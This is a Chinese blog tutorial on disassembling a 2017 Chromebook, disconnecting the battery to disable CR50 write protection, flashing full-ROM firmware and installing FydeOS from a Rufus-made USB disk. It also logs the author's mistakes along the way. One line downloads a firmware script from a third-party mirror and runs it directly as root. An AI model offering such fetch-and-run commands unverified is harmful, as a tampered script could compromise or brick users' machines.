<h3 id="拆机教程"><a href="#拆机教程" class="headerlink" title="拆机教程"></a>拆机教程</h3><aside>
⚠️ 拆机有风险！拔电源线的时候请千万谨慎小心！

</aside>

<p>螺丝分布图</p>
<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc2d31aeb-09cc-4f81-a3c3-b43443ecc85f%2FUntitled.png?table=block&id=355769d2-2089-43e7-bad3-cdcd78cecd40&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="Untitled"></p>
<p>使用电吹风加热胶条,大约5~10分钟后使用起胶硬片插入,让胶条与机器分离</p>
<blockquote>
<p>是真没想到中间这么多螺丝!!!!!</p>
</blockquote>
<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ff7c20487-af9f-4a9d-a07c-aaed513f13ec%2F7706a809170b8df9.jpg?table=block&id=6602d748-29eb-4146-b751-b173bcedec15&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="内部图"></p>
<p>内部图</p>
<p>正中间黄色那颗小螺丝就是固定电源排线(连接到拆下来的后盖那里的那一条线就是电源排线)的螺丝,<strong>注意不要扯断电源排线!!!</strong></p>
<p>拧下螺丝后就可以拆卸下电源线,此时写保护暂时解除了.</p>
<p>方法二：使用<a href="https://wiki.mrchromebox.tech/Firmware_Write_Protect#Hardware_Write_Protection">ccd线解锁</a></p>
<h2 id="刷入BIOS"><a href="#刷入BIOS" class="headerlink" title="刷入BIOS"></a>刷入BIOS</h2><p>进入系统后，按Ctrl+Alt+T可以进入命令行界面，输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>

<p>后回车，进入shell视图后输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span>;curl -LO [https://gitee.com/elao/mr-chromebox-scripts/raw/dev/firmware-util.sh](https://gitee.com/elao/mr-chromebox-scripts/raw/dev/firmware-util.sh) &amp;&amp; sudo bash [firmware-util.sh](http://firmware-util.sh/)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>取自：<a href="http://120.79.199.53/?p=357">BIOS脚本镜像脚本</a></p>
</blockquote>
<p>回车。</p>
<p>进入类似界面</p>
<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F2bad1687-e56b-4d8e-9916-e5d62e6597dd%2FUntitled.png?table=block&id=e7b4a5f8-0c2c-406b-9746-d24b17b26c55&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="Fireware Script"></p>
<p>按照中文提示，查看FW_WP那一栏的提示，如果显示禁用，则代表写保护已经成功解除，如果显示启用，则请重新走解除写保护的教程，或自行查阅更详细的资料。</p>
<p>成功解除写保护后，输入install/update Full ROM Firmware(安装/更新完整固件)前的数字，</p>
<p>如图中的3</p>
<p>输入后回车</p>
<p>按照提示输入Y ，I ACCEPT 后进入备份BIOS界面，如果不想备份的话可以在提示是否备份处输入N后回车，若是需要备份BIOS的话，请插入一个U盘。</p>
<p>结束备份后，会进入下载界面，此时等待即可，刷入完成后会显示绿色的 SUCCESS 或者 成功 ，若是红色的失败或者FAILED则请检查上述步骤或者自行查阅更详细的资料。</p>
<p>安装成功后按回车即可回到主界面</p>
<h2 id="制作U盘启动盘"><a href="#制作U盘启动盘" class="headerlink" title="制作U盘启动盘"></a>制作U盘启动盘</h2><aside>
⚠️ 注意：此操作会清除储存设备中的所有数据！请做好备份！

</aside>

<p>使用Rufus</p>
<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F844778cf-c208-40a6-8f88-dd90190cbb39%2F_IGXWM_M8IG2_0O.jpg?table=block&id=a71285e6-aed3-4227-bb77-29cf721fac33&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="rufus界面"></p>
<p>rufus界面</p>
<p>由上往下看，在<strong>Device</strong>的位置下选择想要作为启动盘的可移动储存设备</p>
<blockquote>
<p>可以通过看卷标来区分是不是你的U盘，如你的U盘卷标是H：盘，那就在这里面选择H盘</p>
</blockquote>
<p>在 <strong>Boot selection</strong> 中下按<strong>SELECT</strong>来选择事先准备好的Fydeos镜像文件,文件格式是img</p>
<p>在 <strong>Parition scheme</strong> 中选择GPT</p>
<p>在<strong>File System</strong> 中选择 fat32</p>
<p>然后按最底下的<strong>START</strong></p>
<p>等待几分钟后就完成啦</p>
<h2 id="刷入系统"><a href="#刷入系统" class="headerlink" title="刷入系统"></a>刷入系统</h2><p>打开刷好BIOS的chromebook 开机会显示兔子图，此时下面会显示按<strong>ESC</strong>进入引导菜单，进入后选择USB boot 选择你的U盘对应的选择，进入fydeos的安装系统，桌面内有一键安装，按照提示一路NEXT即可。</p>
<h1 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h1><h2 id="拆机阶段"><a href="#拆机阶段" class="headerlink" title="拆机阶段"></a>拆机阶段</h2><ul>
<li>没有螺丝刀，去修理店里面只有大一型号的，其他小的都拆不下</li>
<li>去了学校里面的雷锋家电，他们搜了七八个螺丝刀组才找到匹配的螺丝刀</li>
<li>这个背板真是太难拆了，拆开背板之前以为只有边缘有螺丝，发现还是拆不下之后，只能用热吹风处理双面胶，用硬胶片切开双面胶，才能拆开背板胶，然后才发现中间竟然有十颗螺丝！！！</li>
<li>拆开来发现和旧的chromebook不同，没有找到写保护螺丝。在询问了ELAO大佬后才得知2017是使用CR50进行写保护的，于是才有了以上的教程中去除写保护的步骤，一开始我以为是断电失效的，拆了之后又装回去了，回头才发现是要保持拆卸状态，接电源进行BIOS刷写。</li>
<li>发现石墨导热纸底下是没有螺丝的！！！ 我轻轻撕了下来才发现这个秘密</li>
<li>第一次见到了薄膜键盘的结构，确实就是一层薄膜</li>
<li>这款笔记本的电池真是结构非常独特了</li>
</ul>
<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F6fc75a1d-c08f-462c-9558-54d4b67078b8%2F613e7780fdff397.jpg?table=block&id=b2015efb-38a7-471d-bd50-b79f827d02e9&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="电池背板结构"></p>
<p>电池背板结构</p>
<h2 id="刷写阶段"><a href="#刷写阶段" class="headerlink" title="刷写阶段"></a>刷写阶段</h2><ul>
<li><p>本子的Type-C没办法读出USB设备，但是可以正常充电，在海鲜市场咨询过可能是USB电源管理击穿</p>
</li>
<li><p>启动盘制作的过程中下载了iCloud提供的.xz版本的镜像，发现输入后分区有误，重下img.xz版重刷之</p>
</li>
<li><p>因为读取不了USB 在备份阶段也备份不了 在这个位置输入N取消备份</p>
<p>  <img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ff92f3b92-337d-4a7c-863b-6d0c6f9c0174%2F-2d2e56aca575c03.jpg?table=block&id=57b9a97d-6c24-4511-bc0d-990c16cd51fe&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="U盘备份"></p>
</li>
<li><p>之前使用的是FydeOS的教程，教程用例是2013版的，镜像脚本不是我的版本的，导致BIOS下载后校验失败。最后重新找到通用脚本成功刷入</p>
<p>  <img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fccd88a44-151f-41e1-bde4-e411939f29d1%2F770c03f352223123.jpg?table=block&id=15540337-d6ba-4b00-bc31-e3cf5065c0d5&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="刷入失败"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Tutorial</category>
      </categories>
      <tags>
        <tag>chromebook</tag>
        <tag>FydeOS</tag>
      </tags>
  </entry>
</search>
